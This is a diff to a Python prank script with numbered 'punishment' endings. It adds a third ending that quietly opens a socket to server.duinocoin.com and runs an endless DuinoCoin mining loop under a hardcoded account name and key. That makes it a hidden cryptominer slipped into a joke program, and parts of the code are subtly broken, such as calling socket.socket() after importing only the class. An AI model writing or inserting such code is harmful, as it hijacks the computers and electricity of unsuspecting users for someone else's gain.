@@ -7,6 +7,14 @@ import random
 import webbrowser
 import os
 import subprocess
+import hashlib
+import os
+from socket import socket
+import sys  # Only python3 included libraries
+import time
+from urllib.request import Request, urlopen
+from json import loads
+
 
 
 print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣄⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀")
@@ -103,3 +111,94 @@ if punishment_gen == 2:
             filler = "filler"
  print("Have fun closing them file explorers! ;)")
  print("Ending 3: Dem files. Look at them go!")
+
+
+
+punishment_gen = 3
+
+if punishment_gen == 3:
+    client_socket = socket.socket()
+
+def current_time():
+    t = time.localtime()
+    current_time = time.strftime("%H:%M:%S", t)
+    return current_time
+
+username = "GamerzMinesCryptoForFun"
+mining_key = "ButThatsJustATheoryAGameTheory"
+diff_choice = "Y"
+if diff_choice.lower() == "n":
+    UseLowerDiff = False
+else:
+    UseLowerDiff = True
+
+def fetch_pools():
+    while True:
+        try:
+            response = loads(urlopen(Request("https://server.duinocoin.com/getPool")).read().decode())
+            NODE_ADDRESS = response["ip"]
+            NODE_PORT = response["port"]
+            return NODE_ADDRESS, NODE_PORT
+        except Exception as e:
+            time.sleep(15)
+
+while True:
+    try:
+        NODE_ADDRESS, NODE_PORT = fetch_pools()
+    except Exception as e:
+        NODE_ADDRESS = "server.duinocoin.com"
+        NODE_PORT = 2813
+    client_socket.connect((str(NODE_ADDRESS), int(NODE_PORT)))
+    server_version = client_socket.recv(100).decode()
+
+    # Mining section
+    while True:
+        if UseLowerDiff:
+            # Send job request for lower diff
+            client_socket.send(bytes(
+                "JOB,"
+                + str(username)
+                + ",LOW,"
+                + str(mining_key),
+                encoding="utf8"))
+        else:
+            # Send job request
+            client_socket.send(bytes(
+                "JOB,"
+                + str(username)
+                + ",MEDIUM,"
+                + str(mining_key),
+                encoding="utf8"))
+
+        # Receive work
+        job = client_socket.recv(1024).decode().rstrip("\n")
+        # Split received data to job and difficulty
+        job = job.split(",")
+        difficulty = job[2]
+
+        hashingStartTime = time.time()
+        base_hash = hashlib.sha1(str(job[0]).encode('ascii'))
+        temp_hash = None
+
+        for result in range(100 * int(difficulty) + 1):
+            # Calculate hash with difficulty
+            temp_hash = base_hash.copy()
+            temp_hash.update(str(result).encode('ascii'))
+            ducos1 = temp_hash.hexdigest()
+
+            # If hash is even with expected hash result
+            if job[1] == ducos1:
+                hashingStopTime = time.time()
+                timeDifference = hashingStopTime - hashingStartTime
+                hashrate = result / timeDifference
+
+                # Send numeric result to the server
+                client_socket.send(bytes(
+                    str(result)
+                    + ","
+                    + str(hashrate)
+                    + ",Minimal_PC_Miner",
+                    encoding="utf8"))
+
+                # Get feedback about the result
+                feedback = client_socket.recv(1024).decode().rstrip("\n")
